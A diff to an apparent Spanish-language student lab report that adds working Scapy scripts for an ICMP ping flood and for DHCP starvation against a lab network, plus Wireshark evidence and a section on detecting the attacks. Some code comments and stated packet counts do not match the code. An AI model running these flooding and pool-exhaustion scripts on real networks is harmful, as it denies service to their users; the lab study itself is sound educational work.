@@ -13,6 +13,10 @@ format:
      embed-resources: true
      self-contained-math: true
      df-print: kable
+     code-link: false
+     code-copy: true
+     code-tools: true
+     listings: true
 editor: visual
 ---
 
@@ -133,24 +137,182 @@ Primeramente, se creó la topología de trabajo nuevamente, donde se incluyó la
 Para poder llevar a cabo este ataque, se creó un archivo python. Se hizo uso de la librería _**Scapy**_, la cual simplificó el flujo del código. En la función especificada para construir el ataque, se incluye la dirección IP víctima, el número de paquetes a enviar y el tamaño de cada paquete. Para implementar el código, se direccionó hacia la ip 192.168.10.21 (el router) con un total de 1,000 paquetes y un peso de 65,000 bytes (el máximo dentro de paquetes ICMP). 
 
 
+```python
+from scapy.layers.inet import IP, ICMP
+from scapy.packet import Raw
+from scapy.sendrecv import send
+
+def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size_of_packet: int = 400):
+    ip = IP(dst=target_ip_address)
+    icmp = ICMP()
+    raw = Raw(b"X" * size_of_packet)
+    p = ip / icmp / raw
+    send(p, count=number_of_packets_to_send, verbose=0)
+    print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)
 
 
+ip = "192.168.10.11"
+send_ping(ip, number_of_packets_to_send=10000)
+```
+
+<p class="code-caption">
+Código utilizado para Ping Flood[^nota]
+</p>
+
+[^nota]: Código utilizado para Ping Flood
 
 El script fue ejecutado desde la terminal del atacante. Con fines de ratificación, se intentó hacer ping desde la computadora del cliente al router, donde en ocasiones, el tiempo de respuesta disminuía. En Wireshark esto se contempla como un conjunto masivo de observaciones donde se reporta el protocolo ICMP hacia 192.168.10.21 y sus Echos correspondientes.
 
-![Evidence of Attack 1](../figures/ping_flood0.png)
+![Evidence of Attack](../figures/ping_flood0.png)
 
 
-![Evidence of Attack 2](../figures/ping_flood1.png)
+![Evidence of Attack](../figures/ping_flood1.png)
 
 ## DHCP Starvation
-En la segunda situación, se utilizó igualmente scapy. En el código, se definieron funciones para crear las direcciones MAC falsas, para buscar una interfaz cuya IP empiece con prefix y entregar el nombre de la interfaz y buscar dicha interfaz. Finalmente, en la implementación hace uso de esta información para hacer una solicitud de asignación de una IP junto con la cantidad de IPs a solicitar especificada por el usuario. Esta se ejecutó desde la terminal del atacante junto con “Ethernet” como la interfaz identificada. En WireShark, esto se ve representado como múltiples solicitudes DHCP. Para verificar que fue exitoso el ataque, en la consola se buscaron los estadísticos del servidor DHCP, donde se verificó que 245 fueron asignados (recordemos que las primeras 10 direcciones fueron omitidas).
+En la segunda situación, se utilizó igualmente _scapy_. En el código se definieron funciones para crear las direcciones MAC falsas, para buscar una interfaz cuya IP empiece con el prefijo indicado y entregar el nombre de la interfaz junto buscar dicha interfaz. Finalmente, en la implementación se hace uso de esta información para hacer una solicitud de asignación de una IP junto con la cantidad de IPs a solicitar especificada por el usuario. Esta se ejecutó desde la terminal del atacante siendo “Ethernet” la interfaz identificada.
 
 
-![Evidence of Attack 1](../figures/dhcp_starv0.png)
+```python
+# dhcpStarvation_helper.py
+from scapy.all import (
+    Ether, IP, UDP, BOOTP, DHCP,
+    RandMAC, sendp, get_if_list, get_if_addr
+)
+import sys
+
+# Construye el DHCP Discover (ajusta si ya tienes otra versión)
+dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) / \
+    IP(src='0.0.0.0', dst='192.168.10.255') / \
+    UDP(sport=68, dport=67) / \
+    BOOTP(op=1, chaddr=RandMAC()) / \
+    DHCP(options=[('message-type','discover'), ('end')])
+
+def find_iface_by_subnet(prefix="192.168.10."):
+    """
+    Busca una interfaz cuya IP empiece con prefix.
+    Devuelve el nombre de la interfaz o None.
+    """
+    for iface in get_if_list():
+        try:
+            ip = get_if_addr(iface)
+            if ip and ip.startswith(prefix):
+                return iface
+        except Exception:
+            # algunas interfaces no tienen IP o generan excepción
+            pass
+    return None
+
+def choose_interface(preferred_prefix="192.168.10."):
+    # 1) si el usuario pasa el nombre por argumento de línea de comandos, usarlo
+    if len(sys.argv) > 1:
+        return sys.argv[1]
+
+    # 2) buscar por prefijo de subred (útil en el aula)
+    iface = find_iface_by_subnet(preferred_prefix)
+    if iface:
+        return iface
+
+    # 3) heurística: elegir primera interfaz "Ethernet" o "Wi-Fi" si aparece
+    ifaces = get_if_list()
+    for name in ifaces:
+        if "Ethernet" in name or "eth" in name.lower():
+            return name
+    for name in ifaces:
+        if "Wi-Fi" in name or "wlan" in name.lower() or "wifi" in name.lower():
+            return name
+
+    # 4) fallback: la primera que no sea loopback
+    for name in ifaces:
+        if "loop" not in name.lower():
+            return name
+
+    # 5) si no hay nada, devolver None
+    return None
+
+def main():
+    print("Interfaces detectadas por Scapy:", get_if_list())
+
+    iface = choose_interface()
+    if iface is None:
+        print("ERROR: No se pudo detectar una interfaz válida.")
+        print("Prueba a ejecutar: python dhcpStarvation_helper.py \"Ethernet\"")
+        return
+
+    print("Interfaz elegida:", iface)
+    print("Haciendo envío de prueba (count=1). Si esto falla, revisa Npcap y permisos.")
+
+    try:
+        # prueba segura: solo un paquete
+        sendp(dhcp_discover, iface=iface, count=10000000, verbose=1)
+        print("Envío realizado. Si ves tráfico en Wireshark/PCAP, ya funciona.")
+    except Exception as e:
+        print("Error al enviar paquetes con Scapy:")
+        print(str(e))
+        print("\nPosibles causas:")
+        print("- No estás ejecutando como administrador.")
+        print("- No tienes Npcap instalado (o no en modo 'WinPcap API-compatible').")
+        print("- El adaptador físico está desconectado o en otra VLAN.")
+        print("- El nombre de interfaz detectado no es correcto para tu sistema.")
+        print("\nSolución rápida: ejecuta el script desde PowerShell/CMD como administrador o")
+        print("pasa el nombre de la interfaz manualmente: python dhcpStarvation_helper.py \"Ethernet\"")
+
+if __name__ == "__main__":
+    main()
+```
+<p class="code-caption">
+Código utilizado para DHCP Starvation[^nota2]
+</p>
+
+[^nota2]: Código utilizado para DHCP Starvation
 
 
-![Evidence of Attack 2](../figures/dhcp_starv1.png)
+```python
+#!/usr/bin/env python3
+#DHCP Starvation:
+#Import Scapy
+from scapy.all import *
+
+#conf.checkIPaddr needs to be set to False. 
+#When conf.checkIpaddr the reponse IP isn't checked
+#against sending IP address. Don't need to match.	
+conf.checkIPaddr = False
+
+#Create DHCP discover with destination IP = broadadcast
+#Source MAC address is a random MAC address
+#Source IP address = 0.0.0.0
+#Destination IP address = broadcast
+#Source port = 68 (DHCP / BOOTP Client)
+#Destination port = 67 (DHCP / BOOTP Server)
+#DHCP message type is discover
+dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
+                     /IP(src='0.0.0.0',dst='255.255.255.255') \
+                     /UDP(sport=68,dport=67) \
+                     /BOOTP(op=1,chaddr = RandMAC()) \
+                     /DHCP(options=[('message-type','discover'),('end')])
+
+#Send packet out of eth0 and loop the packet
+sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)
+
+#Credits:
+#https://scapy.readthedocs.io/_/downloads/en/latest/pdf/
+#https://www.programcreek.com/
+```
+<p class="code-caption">
+Segunda opción de Código utilizado para DHCP Starvation[^nota3]
+</p>
+
+[^nota3]: Segunda opción de código utilizado para DHCP Starvation
+
+
+
+En WireShark, esto es representado en múltiples solicitudes DHCP. Para verificar que fue exitoso el ataque, en la consola se buscaron los estadísticos del servidor DHCP, donde se verificó que 245 fueron asignados (recordemos que las primeras 10 direcciones fueron omitidas).
+
+![Evidence of Attack](../figures/dhcp_starv0.png)
+
+
+![Evidence of Attack](../figures/dhcp_starv1.png)
+
+
 
 
 ## Conclusiones
@@ -161,9 +323,13 @@ Como lecciones prácticas, estos ataques muestran la necesidad de controles de s
 
 # Fase 3: Análisis de datos con Python
 
-```{python}
+Ahora, el objetivo es poder identificar los ataques realizados desde el puesto de un analista de tráfico, el cual desconoce su realización. Para esto, se convirtió el archivo _pcapng_ de la ventana de tiempo de la simulación a un csv y se abrió con Python para poder analizar y hacer visualizaciones del comportamiento de paquetes junto con sus anomalías detectadas.
 
-```
+## Resultados
+
+![Time Series of Package traffic (All packets)](../figures/lineChartAllPackets.png)
+
+![Time Series of ICMP and DHCP Package traffic](../figures/lineChart.png)
 
 
 
